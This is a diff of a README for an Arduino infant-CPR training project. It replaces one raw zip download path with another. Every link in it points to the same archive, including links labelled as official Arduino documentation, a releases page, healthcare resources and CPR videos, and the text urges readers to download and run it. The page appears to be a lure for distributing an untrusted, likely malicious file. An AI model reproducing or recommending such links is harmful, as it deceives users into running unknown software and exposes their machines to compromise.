@@ -1,6 +1,6 @@
 # 🍼 Arduino_Competiton - Learn Infant CPR Effectively  
 
-[![Download Arduino_Competiton](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)  
+[![Download Arduino_Competiton](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)  
 
 ## 📋 Description  
 The Arduino_Competiton project is a real-time infant CPR training system that uses Arduino technology. This system provides feedback based on pressure, heart rate rhythm, and timing using sensors, LEDs, an OLED display, and buzzer alerts. It was developed during the BECU Arduino Competition at Toronto Metropolitan University with a focus on healthcare applications.  
@@ -9,11 +9,11 @@ The Arduino_Competiton project is a real-time infant CPR training system that us
 To get started with the Arduino_Competiton project, follow these simple steps to download and run the application.  
 
 ## 📥 Download & Install  
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)  
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)  
 
 1. Click on the link above to navigate to the Releases page.  
 2. On the Releases page, you will find the latest version of the application.  
-3. Select the version you want by clicking on the asset link, usually labeled as `https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip`, `https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip`, or similar.  
+3. Select the version you want by clicking on the asset link, usually labeled as `https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip`, `https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip`, or similar.  
 4. The file will begin downloading to your computer.  
 
 ### 🖥️ System Requirements  
@@ -56,8 +56,8 @@ If you encounter any issues while downloading or installing, consider the follow
 
 ## 🔗 More Information  
 For further details on Arduino_Competiton, consider exploring the following resources:  
-- [Arduino Official Documentation](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)  
-- [Healthcare Training Resources](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)  
-- [CPR Training Videos](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/enturret/Arduino_Competiton.zip)  
+- [Arduino Official Documentation](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)  
+- [Healthcare Training Resources](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)  
+- [CPR Training Videos](https://raw.githubusercontent.com/imprudent-brooktrout348/Arduino_Competiton/main/images/Competiton_Arduino_v3.3-alpha.1.zip)  
 
 Feel free to reach out if you have any questions or need assistance. Happy training!  
